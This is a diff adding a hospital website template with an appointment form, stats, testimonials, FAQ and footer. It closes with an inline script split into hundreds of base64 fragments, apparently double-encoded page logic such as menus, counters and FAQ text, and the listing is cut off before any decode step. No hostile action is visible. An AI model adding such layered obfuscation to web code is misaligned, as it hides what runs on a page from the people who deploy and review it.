+                >Department</label
+              ><select class="input-field">
+                <option value="">Select Department</option>
+                <option>Cardiology</option>
+                <option>Neurology</option>
+                <option>Orthopedics</option>
+                <option>Pediatrics</option>
+                <option>Pulmonology</option>
+                <option>Dental</option>
+                <option>Ophthalmology</option>
+                <option>Oncology</option>
+              </select>
+            </div>
+            <div>
+              <label
+                class="block text-xs font-700 uppercase tracking-widest mb-2"
+                style="color: var(--muted)"
+                >Preferred Date</label
+              ><input type="date" class="input-field" />
+            </div>
+            <div class="md:col-span-2">
+              <label
+                class="block text-xs font-700 uppercase tracking-widest mb-2"
+                style="color: var(--muted)"
+                >Message (Optional)</label
+              ><textarea
+                class="input-field"
+                rows="3"
+                placeholder="Describe your symptoms or concerns..."
+              ></textarea>
+            </div>
+            <div class="md:col-span-2">
+              <button class="btn-primary w-full text-base">
+                Confirm Appointment →
+              </button>
+              <p class="text-xs text-center mt-3" style="color: var(--muted)">
+                🔒 Your information is private and secure. We never share your
+                data.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="py-16 px-6" style="background: var(--primary)">
+      <div
+        class="max-w-6xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-8 text-center"
+      >
+        <div class="reveal">
+          <div
+            class="font-display text-4xl font-800 text-white stat-counter"
+            data-target="40"
+          >
+            0
+          </div>
+          <div class="text-sm mt-1" style="color: rgba(255, 255, 255, 0.7)">
+            Departments
+          </div>
+        </div>
+        <div class="reveal" style="transition-delay: 0.1s">
+          <div
+            class="font-display text-4xl font-800 text-white stat-counter"
+            data-target="850"
+          >
+            0
+          </div>
+          <div class="text-sm mt-1" style="color: rgba(255, 255, 255, 0.7)">
+            Specialists
+          </div>
+        </div>
+        <div class="reveal" style="transition-delay: 0.2s">
+          <div
+            class="font-display text-4xl font-800 text-white stat-counter"
+            data-target="250000"
+          >
+            0
+          </div>
+          <div class="text-sm mt-1" style="color: rgba(255, 255, 255, 0.7)">
+            Patients Served
+          </div>
+        </div>
+        <div class="reveal" style="transition-delay: 0.3s">
+          <div
+            class="font-display text-4xl font-800 text-white stat-counter"
+            data-target="39"
+          >
+            0
+          </div>
+          <div class="text-sm mt-1" style="color: rgba(255, 255, 255, 0.7)">
+            Years of Excellence
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="py-20 px-6" style="background: #fff">
+      <div class="max-w-5xl mx-auto">
+        <div class="text-center mb-12">
+          <div class="pill mb-4 reveal">Testimonials</div>
+          <h2
+            class="text-4xl font-800 text-primary reveal"
+            style="transition-delay: 0.1s"
+          >
+            What Patients Say
+          </h2>
+        </div>
+        <div class="grid md:grid-cols-3 gap-6">
+          <div class="card p-7 reveal">
+            <div class="flex gap-1 mb-4" style="color: var(--accent)">
+              ★★★★★
+            </div>
+            <p class="text-sm leading-relaxed mb-5" style="color: var(--muted)">
+              "After my cardiac surgery, the care team at MediCare+ was
+              extraordinary. I recovered in half the expected time and felt
+              supported every single day."
+            </p>
+            <div class="flex items-center gap-3">
+              <div
+                class="w-9 h-9 rounded-full flex items-center justify-center text-white text-sm font-bold"
+                style="background: var(--primary)"
+              >
+                M
+              </div>
+              <div>
+                <div class="text-sm font-700">Michael Torres</div>
+                <div class="text-xs" style="color: var(--muted)">
+                  Cardiac Patient
+                </div>
+              </div>
+            </div>
+          </div>
+          <div
+            class="card p-7 reveal"
+            style="
+              transition-delay: 0.1s;
+              border-color: rgba(10, 110, 92, 0.25);
+            "
+          >
+            <div class="flex gap-1 mb-4" style="color: var(--accent)">
+              ★★★★★
+            </div>
+            <p class="text-sm leading-relaxed mb-5" style="color: var(--muted)">
+              "Dr. Tanaka was incredible with my daughter. The pediatrics ward
+              is child-friendly, and the staff made her feel safe and
+              comfortable throughout."
+            </p>
+            <div class="flex items-center gap-3">
+              <div
+                class="w-9 h-9 rounded-full flex items-center justify-center text-white text-sm font-bold"
+                style="background: #8b5cf6"
+              >
+                L
+              </div>
+              <div>
+                <div class="text-sm font-700">Linda Osei</div>
+                <div class="text-xs" style="color: var(--muted)">
+                  Parent, Pediatrics
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="card p-7 reveal" style="transition-delay: 0.2s">
+            <div class="flex gap-1 mb-4" style="color: var(--accent)">
+              ★★★★★
+            </div>
+            <p class="text-sm leading-relaxed mb-5" style="color: var(--muted)">
+              "As an international patient flying in from overseas, the
+              dedicated coordinator handled everything — from airport pickup to
+              my follow-up appointments."
+            </p>
+            <div class="flex items-center gap-3">
+              <div
+                class="w-9 h-9 rounded-full flex items-center justify-center text-white text-sm font-bold"
+                style="background: var(--accent)"
+              >
+                A
+              </div>
+              <div>
+                <div class="text-sm font-700">Ahmed Al-Rashid</div>
+                <div class="text-xs" style="color: var(--muted)">
+                  International Patient
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="faq" class="py-24 px-6" style="background: var(--bg)">
+      <div class="max-w-3xl mx-auto">
+        <div class="text-center mb-12">
+          <div class="pill mb-4 reveal">FAQ</div>
+          <h2
+            class="text-4xl font-800 text-primary reveal"
+            style="transition-delay: 0.1s"
+          >
+            Common Questions
+          </h2>
+        </div>
+        <div id="faqWrap" class="flex flex-col gap-3"></div>
+      </div>
+    </section>
+    <section class="py-24 px-6" style="background: var(--hero-grad)">
+      <div class="max-w-4xl mx-auto text-center">
+        <h2 class="text-4xl md:text-5xl font-800 text-white mb-4 reveal">
+          Need Medical Attention<br />Right Now?
+        </h2>
+        <p
+          class="mb-8 reveal"
+          style="color: rgba(255, 255, 255, 0.8); transition-delay: 0.1s"
+        >
+          Our emergency team is available 24 hours a day, 7 days a week. Don't
+          wait — call us immediately.
+        </p>
+        <div
+          class="flex flex-col sm:flex-row items-center justify-center gap-4 reveal"
+          style="transition-delay: 0.2s"
+        >
+          <a href="tel:+18005550100" class="btn-white text-lg"
+            >📞 Call Emergency: 1-800-555-0100</a
+          ><a href="#appointment" class="btn-outline-white">Book Online</a>
+        </div>
+      </div>
+    </section>
+    <footer class="py-16 px-6" style="background: var(--dark)">
+      <div class="max-w-6xl mx-auto">
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-10 mb-12">
+          <div class="col-span-2">
+            <div class="flex items-center gap-2 mb-4">
+              <div
+                class="w-8 h-8 rounded-lg flex items-center justify-center text-white font-bold"
+                style="background: var(--primary)"
+              >
+                ✦
+              </div>
+              <span class="font-display font-700 text-white text-lg"
+                >Medi<span
+                  class="text-primary-light"
+                  style="color: var(--primary-light)"
+                  >Care</span
+                ><span style="color: var(--accent)">+</span></span
+              >
+            </div>
+            <p
+              class="text-sm mb-5"
+              style="color: #6b8aaa; line-height: 1.8; max-width: 250px"
+            >
+              World-class healthcare delivered with compassion. Accredited since
+              1984.
+            </p>
+            <div
+              class="text-xs font-700 uppercase tracking-widest"
+              style="color: var(--primary-light)"
+            >
+              Created by MyanCode
+            </div>
+          </div>
+          <div>
+            <div
+              class="text-xs font-700 uppercase tracking-widest mb-4"
+              style="color: #6b8aaa"
+            >
+              Hospital
+            </div>
+            <ul class="flex flex-col gap-2 text-sm" style="color: #6b8aaa">
+              <li>
+                <a href="#" class="hover:text-white transition-colors"
+                  >About Us</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#departments"
+                  class="hover:text-white transition-colors"
+                  >Departments</a
+                >
+              </li>
+              <li>
+                <a href="#doctors" class="hover:text-white transition-colors"
+                  >Our Doctors</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#appointment"
+                  class="hover:text-white transition-colors"
+                  >Appointments</a
+                >
+              </li>
+            </ul>
+          </div>
+          <div>
+            <div
+              class="text-xs font-700 uppercase tracking-widest mb-4"
+              style="color: #6b8aaa"
+            >
+              Contact
+            </div>
+            <ul class="flex flex-col gap-2 text-sm" style="color: #6b8aaa">
+              <li>📍 123 Medical Drive, NY</li>
+              <li>📞 1-800-555-0100</li>
+              <li>✉️ info@medicare-plus.com</li>
+              <li>🕐 24/7 Emergency</li>
+            </ul>
+          </div>
+        </div>
+        <div
+          class="divider mb-6"
+          style="
+            background: linear-gradient(
+              90deg,
+              transparent,
+              #1e2d45,
+              transparent
+            );
+          "
+        ></div>
+        <div
+          class="flex flex-col md:flex-row items-center justify-between gap-4 text-sm"
+          style="color: #6b8aaa"
+        >
+          <p>© 2026 MediCare Plus. All rights reserved.</p>
+          <p class="font-700" style="color: var(--primary-light)">
+            Template by MyanCode — All Rights Reserved
+          </p>
+        </div>
+      </div>
+    </footer>
+    <script>
+      !(function () {
+        var _0x127348 = "KGZ1bmN0aW9uKCl7C";
+        var _0xa27ed2 = "nZhciBfMHhlNjYw";
+        var _0x588ea7 = "MGE9IktHWjFibU4w";
+        var _0x0884f8 = "YVc5dUtDbDdDbiI7d";
+        var _0xa26a0d = "mFyIF8weDIx";
+        var _0x31d01d = "NWVjNz0iWmhjaU";
+        var _0x51b954 = "JmYm1GMlBXUnYiO3ZhciBf";
+        var _0x45ca71 = "MHg0MWNiODI9Ilk";
+        var _0xe70414 = "zVnRaVzUwTG1kbCI7dmFyI";
+        var _0x466e46 = "F8weDQ4YzY0ZT0iZEVWc1";
+        var _0x84aa80 = "pXMWxibiI7dmFy";
+        var _0x132efd = "IF8weGQ3ZmI";
+        var _0x4d6f06 = "zMj0iUkNlVWxrS0NkdVlYI";
+        var _0xedd02d = "jt2YXIgXzB4Zj";
+        var _0xc93f46 = "RkYjQ3PSJaaVlYSW5LVH";
+        var _0x0e343e = "NLZDJsdVpHOTM";
+        var _0xb885c6 = "iO3ZhciBfMH";
+        var _0x8fd439 = "g2ZTA3YTA9IkxtRmtaRVY";
+        var _0x9e4bb2 = "yWlc1MFRHbHpkIj";
+        var _0x31e0c6 = "t2YXIgXzB4OWRj";
+        var _0x28af8c = "NGFjPSJHVnVaWElvSjNOI";
+        var _0xc3f2fd = "jt2YXIgXzB4O";
+        var _0xe26648 = "GNmMjBjPSJqY205c";
+        var _0x124a83 = "2JDY3NablZ1WTNScGIiO3Z";
+        var _0xc0be6c = "hciBfMHg3ZTM4YzA9IjI0b0";
+        var _0x6a2ee5 = "tYdGZibUYyTG1Ocy";
+        var _0x0fde69 = "I7dmFyIF8weGI3NjI2";
+        var _0x8ca443 = "Nj0iWVhOelRHbH";
+        var _0x88828a = "pkQzUwYjJkbmIiO3ZhciBfM";
+        var _0x9d76bd = "Hg2NjBmY2Q9IkdVb0ozT";
+        var _0xbf584e = "mpjbTlzYkdWa0p5eDMiO3Zh";
+        var _0x01f06f = "ciBfMHgwNTRiNGQ9ImFXN";
+        var _0x3248e8 = "WtiM2N1YyI7dmFyI";
+        var _0x27ad69 = "F8weDE2NDc2OT0";
+        var _0x104175 = "iMk55YjJ4c1dUNDAiO3Zhc";
+        var _0xc0bcbb = "iBfMHg4NTcyM";
+        var _0x8589c7 = "2I9Ik1DazdmU2";
+        var _0xe57ba9 = "s3Q25aaGNpIjt";
+        var _0x6b529a = "2YXIgXzB4N2U1N2Q";
+        var _0xd28c8a = "5PSJCZmJXSTlaRzlqZ";
+        var _0xa7cbd7 = "FcxbGJuIjt2YXIgXzB4MDg4";
+        var _0xc22e39 = "YTg4PSJRdVoyVjBSV3hs";
+        var _0x70364a = "Ijt2YXIgXzB4Mj";
+        var _0xd94da4 = "c2NDcyPSJiV1Z1ZEVK";
+        var _0x62bb6c = "NVNXUW9KMjFsYiI7dmFy";
+        var _0xf19998 = "IF8weDc1MmM";
+        var _0x6864ca = "0ND0iblZDZE";
+        var _0x6719fd = "c0bktUc0tkbUZ5SUY5I";
+        var _0x0a8165 = "jt2YXIgXzB4";
+        var _0x1b2976 = "NjUzZDYyPSJ0YlQxa2IyT";
+        var _0xf6b70c = "jFiV1Z1ZEM1blpYIj";
+        var _0xdbc1a4 = "t2YXIgXzB4MThi";
+        var _0x904484 = "ODk4PSJSRmJHVn";
+        var _0xc95151 = "RaVzUwUW5sIjt2YXIgXzB4";
+        var _0x9653a6 = "NTQwNTVlPSJKWk";
+        var _0x705f64 = "NnbmJXOWlhVyI7dmFyIF8we";
+        var _0x111fb7 = "GJlZDQ0ZT0ieGx";
+        var _0x9028f0 = "UV1Z1ZFNjcE93cGZiIj";
+        var _0x16fbd3 = "t2YXIgXzB4ZjBhYTk1";
+        var _0x616e6f = "PSJXSXVZV1JrUlhab";
+        var _0x063e4e = "GJuIjt2YXIgXzB4ZTMz";
+        var _0x6fbb29 = "NTQ2PSJSTWFYTjB";
+        var _0xb0c2e1 = "aVzVsYyI7dmFyIF8weGFj";
+        var _0xe88fb2 = "NTYzNT0iaWduWTJ4cFkyc25";
+        var _0x9b85cf = "MR1oxYm1OIj";
+        var _0xbd463c = "t2YXIgXzB4NTIx";
+        var _0x4c770b = "ZGZhPSIwYVc5dUt";
+        var _0x02967a = "DbDdYMiI7dmFyIF8weG";
+        var _0xea2055 = "ZlMzE3Zj0iMXRMb";
+        var _0x32ca0e = "U5zWVhOelRHbHpkQzUiO";
+        var _0x950737 = "3ZhciBfMHg5MWZlNDA9IjBi";
+        var _0xc58281 = "MmRuYkdVb0oiO";
+        var _0x1a1050 = "3ZhciBfMHg1MDM1MTg9IjJo";
+        var _0x7a5ad6 = "cFpHUmxiaWNwIjt2";
+        var _0xeab6a9 = "YXIgXzB4OTVj";
+        var _0xa6ad31 = "MGJmPSJPMTl";
+        var _0x0626a5 = "0YlM1amJHRnpjIjt2YXIgXz";
+        var _0x5456b2 = "B4ZDg0NmI4PSIweHBjM1F1Z";
+        var _0x55cce0 = "Ec5bloyeGwiO3Zhc";
+        var _0xd01797 = "iBfMHg0MzBmZDM9IktDZG1";
+        var _0x5ecc3c = "iR1Y0SnlrN2ZTayI7dmF";
+        var _0xfb540a = "yIF8weDYwNjIwM";
+        var _0x23ca40 = "T0iN0NsOXRiUzV4Z";
+        var _0x035b18 = "FdWeWVWTmwiO3ZhciBf";
+        var _0x7f3233 = "MHhlZWZlYTU9Im";
+        var _0x3020ec = "JHVmpkRzl5USI7dmFyIF8we";
+        var _0x89a71e = "DY4Y2ViMD0iV3h";
+        var _0x8dca9c = "zS0NkaEp5a3";
+        var _0xc824de = "VaIjt2YXIgX";
+        var _0xc65d5f = "zB4YTA3YjAzPSJtOXlS";
+        var _0x84850b = "V0ZqYUNobWRXIjt";
+        var _0x948778 = "2YXIgXzB4YTliNjAwP";
+        var _0x2405e5 = "SI1amRHbHZiaWhoS1h0aEx";
+        var _0x5c7928 = "tRmsiO3ZhciBfMHgzY2J";
+        var _0x364f49 = "mYmQ9IlpFVjJaVzUwV";
+        var _0xfd4a8c = "EciO3ZhciBfMHgxNm";
+        var _0xe4dd70 = "Y2M2U9Imx6ZEdWd";
+        var _0x5a8af5 = "VpYSSI7dmFyIF8weD";
+        var _0x6a9d14 = "kwMTJlMj0ib";
+        var _0xc33c76 = "0oyTnNhV05ySn";
+        var _0x5d1a98 = "l4Ijt2YXIgXzB4M2Uy";
+        var _0x6b9d69 = "YjI1PSJtZFc1amRHbHZi";
+        var _0x3fbc23 = "aWdwZTEiO3ZhciBf";
+        var _0x70c109 = "MHgxNjY1Y2E9Ijl0YlM1a";
+        var _0x393119 = "mJHRnoiO3ZhciBfMHg";
+        var _0x812e1b = "5ZTgyMTA9ImMwe";
+        var _0x1325ad = "HBjM1F1WVdSa0t";
+        var _0x2b76bf = "DZG9hVyI7dmFyIF8weDFk";
+        var _0xda6e3e = "MDMxZT0iUmtaVzRuS1";
+        var _0xafe36f = "R0Ijt2YXIgXzB4";
+        var _0x2640d8 = "ZjI0ZjZkPSJmYlcw";
+        var _0xc97057 = "dVkyeGhjM05NYVhO";
+        var _0xb14c96 = "MExuIjt2YXIgXzB4NTYz";
+        var _0xe59c6c = "ZGU0PSJKbGJXOTJaU2duWm";
+        var _0xdd39a0 = "14bGVDY3BPI";
+        var _0x347ae4 = "jt2YXIgXzB4MDc2ZTUzPSIz";
+        var _0xb1758d = "MHBPMzBwT3dw";
+        var _0xe3b7f6 = "MllYSSI7dmFyIF8";
+        var _0xf9a451 = "weDdlY2JlNj0i";
+        var _0x3e1420 = "Z1gyOWljejF1WlhjIjt";
+        var _0xcf6b3b = "2YXIgXzB4NDMyZDNh";
+        var _0x31d6ad = "PSJnU1c1MFpYSn";
+        var _0xfda520 = "oiO3ZhciBfMHg4ZTgw";
+        var _0x50b904 = "OTE9IlpXTjBhVzl1VCI";
+        var _0x642a5d = "7dmFyIF8weDQzO";
+        var _0x024bc2 = "TExNT0iMkp6WlhKMlp";
+        var _0x6ad78f = "YSW8iO3ZhciBfMHg1ZjhiZ";
+        var _0x495460 = "Dk9IlpuVnVZM1JwY";
+        var _0xec43dd = "iI7dmFyIF8we";
+        var _0x57050f = "GVmZTFkYz0iMjR";
+        var _0xaba2f3 = "vWlc1MGNtbG";
+        var _0xfbfd33 = "xjeWw3Wlc1Ijt2YXI";
+        var _0x3554e3 = "gXzB4OWM5NTU";
+        var _0x1df1ce = "yPSIwY21sbGN5NW1iM";
+        var _0x58477f = "0pGWVdOIjt2YXIgXzB4M2Q";
+        var _0xd6ca1a = "2YzViPSJvS0d";
+        var _0x41e0a7 = "aMWJtTjBhVzl1SyI7dmFyI";
+        var _0x950675 = "F8weDVmODMxMj0iR1VwZTJs";
+        var _0x66f028 = "bUtHVXVhWE5KYm4iO3Zhci";
+        var _0xd8b547 = "BfMHg4MTlmZjY9";
+        var _0xe4e5b2 = "IlJsY25ObFkzUnBiIjt2Y";
+        var _0x1ee152 = "XIgXzB4ZTcwNzYy";
+        var _0x83b64d = "PSJtY3BaUzUwW";
+        var _0x9e21ee = "VhKblpYUXVZMn";
+        var _0xc0f2da = "giO3ZhciBfMHhjYj";
+        var _0x0d8eb1 = "cwNzA9ImhjM05NYVhOMCI";
+        var _0xf3d171 = "7dmFyIF8weD";
+        var _0x8dfb49 = "E5NmU3Nj0iTG1Ga1pDZ25";
+        var _0x572a72 = "kbWx6YVciO3Z";
+        var _0xff125f = "hciBfMHhhYjA4";
+        var _0x06ee2d = "NGE9IkpzWlNjcE8zM";
+        var _0x83d707 = "HAiO3ZhciBf";
+        var _0x8e4315 = "MHgyNjM1YzQ9I";
+        var _0xd52cd8 = "k8zMHNlM1JvY21Wem";
+        var _0x8a28f4 = "FHOXNaRG8iO3ZhciBfMHg";
+        var _0x1e30c4 = "3ZmNiZTI9IndMakV5Zl";
+        var _0x12a854 = "NrN0NtUnZZMy";
+        var _0x3b8698 = "I7dmFyIF8weDY1OTkzMD0";
+        var _0x578dbf = "iVnRaVzUwTG5G";
+        var _0x1cee1f = "Ijt2YXIgXzB4NjczYzQ2";
+        var _0xd4031b = "PSIxWlhKNVUyVnNaV04wIj";
+        var _0x807a9a = "t2YXIgXzB4YzY2YjM1PSJi";
+        var _0x08abce = "M0pCYkd3b0p5NXlaWF";
+        var _0x8b2d10 = "oiO3ZhciBfM";
+        var _0x938bc7 = "Hg0YzMwMzE9ImxZV3duS1";
+        var _0xd7022d = "M1bWIzIjt2YXIgXz";
+        var _0xe66740 = "B4MzJiNmQwPSJKRllX";
+        var _0x3de373 = "Tm9LR1oxYm1OMGFXI";
+        var _0x92f321 = "jt2YXIgXzB4ODBlMD";
+        var _0xc24097 = "liPSI5dUtISXBlMTl2W";
+        var _0xc76b5e = "SI7dmFyIF8weDRkZWN";
+        var _0x71f25f = "mND0ibk11Yj";
+        var _0x1c82d8 = "JKelpYSjJaU2h5S";
+        var _0xd2cadc = "1R0Ijt2YXIgXzB4YzkxM";
+        var _0xc2353a = "DkyPSI5S1RzS1puVnVZM";
+        var _0x98f6cd = "1JwYjI0ZyI7dmFy";
+        var _0xd6bbed = "IF8weDYxNjQyNj0iWDJGdW";
+        var _0xde0713 = "FXMURkSEp6I";
+        var _0x118fb4 = "jt2YXIgXzB4ZjExYjA0PS";
+        var _0xa081cc = "JLQ2w3Wkc5amRXMW";
+        var _0xddb61a = "xiblF1Ijt2YXIgX";
+        var _0x89c3b4 = "zB4YTBhNDA1PSJjWFZs";
+        var _0xcebd45 = "Y25sVFoiO3ZhciBfMHg";
+        var _0xdd063f = "wYjczZTg9Ild4b";
+        var _0xbbc00e = "FkzUnZja0ZzYkNnbkxuTiI";
+        var _0x3cfb61 = "7dmFyIF8weGRhMTA";
+        var _0xc14fc1 = "xMj0iMFlYUXRZMjkxYm";
+        var _0x3e53e0 = "5SbGNpY3AiO3ZhciBfMH";
+        var _0x2e9d29 = "hhNjdmOTY9Ikx";
+        var _0xed35ff = "tWnZja1ZoWTJnb1puVnVZI";
+        var _0xe54359 = "jt2YXIgXzB4N2UzYWNmP";
+        var _0x048e4c = "SIzUnBiMjRvWld3Ijt2YXI";
+        var _0xbff263 = "gXzB4ZWZkMzE5P";
+        var _0xfd5e77 = "SJwZTNaaGNpQjBQWEJo";
+        var _0x068285 = "Y24iO3ZhciBfMHgzNmE5Mj";
+        var _0x4973a0 = "U9Ik5sU1c1MEtHVnN";
+        var _0xf95e74 = "MbVJoZEdGeiI7dmFyIF8";
+        var _0xf32daa = "weDUzYTVjOT0iWlhRdWR";
+        var _0xc97e8f = "HRnlaMlYwSyI7";
+        var _0xf9e45c = "dmFyIF8weGFmNWVlMz0iVH";
+        var _0x66dbdd = "QyWVhJZ1pEMHhPREF3TzM";
+        var _0x31cdf7 = "iO3ZhciBfMHhiMzg4M";
+        var _0x5c3936 = "mU9IlpoY2lC";
+        var _0x42e648 = "elBYQmxjbVoiO";
+        var _0x34ff32 = "3ZhciBfMHg3YjAxYm";
+        var _0x7b14c2 = "Y9InZjbTFoYm1ObEw";
+        var _0x435bb4 = "iO3ZhciBfMHg2OTB";
+        var _0x39cb0e = "iZDQ9Im01dmR5Z3BPM";
+        var _0x8c6b53 = "loiO3ZhciBfMHgz";
+        var _0xac9b26 = "YTU4ZDY9IjFibU4";
+        var _0x9f6b14 = "wYVc5dUlIVW9kSE1wIj";
+        var _0x3693d2 = "t2YXIgXzB4OGV";
+        var _0xb9bed2 = "lNGYzPSJlM1poY2lCd1BVMW";
+        var _0xfb2d2f = "hkR2d1YlciO3ZhciB";
+        var _0xa754ee = "fMHgzZjliM2M9Im";
+        var _0xf6cf3b = "x1S0NoMGN5MXpL";
+        var _0xfe2fab = "UzlrIjt2YXIgXzB4N";
+        var _0x8ce2c9 = "WUyOGQ1PSJMREVwTzNa";
+        var _0x0cca50 = "aGNpQmxQVEV0VFciO3Z";
+        var _0xadb4a3 = "hciBfMHg3ZWM2";
+        var _0x29184c = "ODM9IkYwYUM1d2I";
+        var _0x5310a4 = "zY29NIjt2YXIgXzB";
+        var _0x264c40 = "4NGZmNzJmPSJTMXdM";
+        var _0x5a2487 = "RE1wTzJWc0xuIjt2YXIgXz";
+        var _0xd1bbb5 = "B4N2UxN2E2PSJSbGVIUkRi";
+        var _0x9b56ac = "MjUiO3ZhciBfMHhh";
+        var _0xf11d2c = "ODhhYjE9IjBaV";
+        var _0xd60fff = "zUwUFUxaGRHZ3VjbSI";
+        var _0xebda0e = "7dmFyIF8weDM5ODY";
+        var _0x52aecc = "yNj0iOTFibVFvWlN";
+        var _0x83b89c = "wMEsiO3ZhciBfMHhlNzNkYz";
+        var _0xb68dbc = "A9IlM1MGIweHZZMkZzWl";
+        var _0xd220b7 = "ZOMCI7dmFyI";
+        var _0x48c1a6 = "F8weDI1MDY2";
+        var _0x386f52 = "OD0iY21sdVp5Z3BL";
+        var _0xee321a = "eSI7dmFyIF8we";
+        var _0xfb1dba = "DgwNWI5Nz0iaGxiQ";
+        var _0x78d3de = "zVrWVhSaGMyV";
+        var _0x0c828b = "jBMbk4xWiI7dmFyI";
+        var _0xac5b61 = "F8weDAxNzQ1Yz0ibVpwZU";
+        var _0x3fe28d = "h4OEp5Y3BPMmwiO3ZhciBfM";
+        var _0xd19cc8 = "HhiYzNhZjA9Im1";
+        var _0x509c8b = "LSEE4TVNseVpYRjFaWE4wU";
+        var _0x34d7f2 = "SI7dmFyIF8w";
+        var _0x9af2d0 = "eGVkZWE2ZT0iV";
+        var _0x81b37b = "zVwYldGMGFXOXV";
+        var _0x9a490e = "SbkpoYldVbyI7";
+        var _0x7c8b3a = "dmFyIF8weDcwNDM0NT0iZF";
+        var _0xf4fbba = "NrN2ZYSmxjWFYiO3ZhciBfM";
+        var _0x78e2c6 = "HhmZTBiZTY9ImxjM";
+        var _0xb6e796 = "1JCYm1sdFlYUnAiO3Zhc";
+        var _0xef275b = "iBfMHhiZTdjNmE";
+        var _0x99dc20 = "9ImIyNUdjbUZ0Wl";
+        var _0x380811 = "NoMUtUdDlLVH";
+        var _0x3d7bff = "QiO3ZhciBfMHhjMGYwNG";
+        var _0x23df55 = "U9IjlDblpoY2lC";
+        var _0xb59112 = "ZmMwOWljejF1";
+        var _0x6955ae = "WiI7dmFyIF8weGM3";
+        var _0x935db3 = "YmRjYz0iWGNnU1c1M";
+        var _0x6c0135 = "FpYSnpaV04wYVc5I";
+        var _0x6adc26 = "jt2YXIgXzB4";
+        var _0x275f61 = "NjFjMWI1PSJ1VDJKelpYSj";
+        var _0xb94ce5 = "JaWElvWm5WIjt2YXIgXzB4Z";
+        var _0xb1f00d = "WE3NzRhPSJ1WT";
+        var _0xf4648b = "NScGIyNG9aVzUiO3ZhciBfM";
+        var _0xedcf05 = "HhjZDQwNjY9IjBjb";
+        var _0x1ca6b2 = "WxsY3lsN1pXIjt2YX";
+        var _0xeaf092 = "IgXzB4MTVjZGQ0PSI1MGN";
+        var _0xede117 = "tbGxjeTUiO3Zhc";
+        var _0xfddb95 = "iBfMHg2YzhkOTA9";
+        var _0x785841 = "Im1iM0pGWVdOb0tHWjFiI";
+        var _0xf0526d = "jt2YXIgXzB4OGI4";
+        var _0x9dcc5d = "MzIyPSJtTjBhVzl1S";
+        var _0xc7403d = "0dVIjt2YXIgXzB4N";
+        var _0x523eac = "jgzZGIxPSJwZTJsbUtHV";
+        var _0xabeffb = "XVhWE5KYm5Sb";
+        var _0x6cf1ee = "GMiO3ZhciBf";
+        var _0x422f8a = "MHhlYzgwN2Q9Im5ObFkz";
+        var _0xa8d158 = "UnBibWNwZTE5aGIiO3ZhciB";
+        var _0x53f989 = "fMHg3YzAxNzg9I";
+        var _0x54c855 = "m1sdFEzUnljeWdwTzE5el";
+        var _0x12060b = "QySiI7dmFyIF8weDNm";
+        var _0x75bac7 = "MjQ4ZT0iekxtUn";
+        var _0x0be7f2 = "BjMk52Ijt2YXIgX";
+        var _0x06aebc = "zB4ZDJlZWEzPS";
+        var _0x7d0c17 = "JibTVsWTNRb0siO3ZhciBfM";
+        var _0xe12d91 = "HhmMzdiMWE9";
+        var _0xc4caa2 = "IlR0OWZTazdmU3g3Z";
+        var _0xdcc503 = "EdoeVoiO3ZhciBf";
+        var _0xaedae5 = "MHhiYmY0MDk";
+        var _0xfafd39 = "9IlhOb2IyeGtPakF";
+        var _0x16bb58 = "1TkgwIjt2YXIgX";
+        var _0xd2fd6b = "zB4MWQ3YTky";
+        var _0x6d41cc = "PSJwT3dwMllYS";
+        var _0x1b1e51 = "WdYM05qUFciO3ZhciBfMHhm";
+        var _0x006e3b = "ZDk2MjA9IlJ2WTNWdFpXNT";
+        var _0xc4c677 = "BMbkYxWlhKN";
+        var _0x253b1b = "SI7dmFyIF8w";
+        var _0xfd49cd = "eDBiNDJkOT0iVTJWc1";
+        var _0xb44e51 = "pXTjBiM0lvS";
+        var _0x4cf626 = "iI7dmFyIF8weGU";
+        var _0xf2dcda = "wODljNj0ieTV6ZEdGME";
+        var _0xc59b4e = "xXTnZkVzUwWlhJIjt";
+        var _0xb75074 = "2YXIgXzB4Njk0YTJhPSJ";
+        var _0x8b8b4d = "uS1R0cFppaGZjMk1wIjt2Y";
+        var _0x2afb80 = "XIgXzB4MmRiN2Q3P";
+        var _0x070027 = "SJYM05QWW5Nd";
+        var _0xd419a0 = "WIiO3ZhciBf";
+        var _0x967be8 = "MHg4NGU0NGM9Ij";
+        var _0xc014bd = "JKelpYSjJaU2hmYzJNdV";
+        var _0xf0bb63 = "kyeCI7dmFyIF8weGQ3Y";
+        var _0x7a5c64 = "jQ3YT0idmMyVnpkQ2duIjt";
+        var _0x15d561 = "2YXIgXzB4OGQ3NTI";
+        var _0x875222 = "2PSJjMlZqZEd";
+        var _0x7d93ef = "sdmJpY3BLVHNLZG0i";
+        var _0xf37f61 = "O3ZhciBfMHgwZjE1ODI9Ik";
+        var _0x2065d9 = "Z5SUY5bVlYRnpQVn";
+        var _0x4f0553 = "NLZTNFIjt2YXIgX";
+        var _0x0a1e07 = "zB4ZWVmYjdjP";
+        var _0xa379fc = "SI2SjBodmR5Qm";
+        var _0x81b5e8 = "tieUJKSUdKIj";
+        var _0x6b6439 = "t2YXIgXzB4ZjAyZjk0";
+        var _0xc7cf7b = "PSJ2YjJzZ1lXNGdZ";
+        var _0xea0073 = "WEJ3YjJsdSI7dmFyI";
+        var _0xc66a61 = "F8weDVjMWFjOD0iZE";
+        var _0x200168 = "cxbGJuUS9KeXgiO3ZhciB";
+        var _0xe00369 = "fMHg3Yzc0YWE9Imh";
+        var _0x29705b = "PaWRaYjNVZ1kyRnVJR0oiO";
+        var _0x702469 = "3ZhciBfMHg3";
+        var _0xe03be0 = "ZDg5MTc9InZiMnNnY";
+        var _0x195430 = "jI1c2FXNWxJSCI7dmF";
+        var _0xb87587 = "yIF8weDY2MWI2Mz0";
+        var _0x2fcf5e = "iWnBZU0J2ZFh";
+        var _0x006593 = "JZ1lYIjt2YXIgXzB4ND";
+        var _0x2e149b = "hhN2E4PSJCd2Iyb";
+        var _0x80c163 = "HVkRzFsYm5RIjt2YXIgXzB";
+        var _0x6c9f27 = "4ODc5Y2Q4PSJnWm0";
+        var _0x51b0a9 = "5eWJTQmhZbSI7dmFyIF8we";
+        var _0x5c1f50 = "DM0NTBmYz0iOTJaU3dnWT";
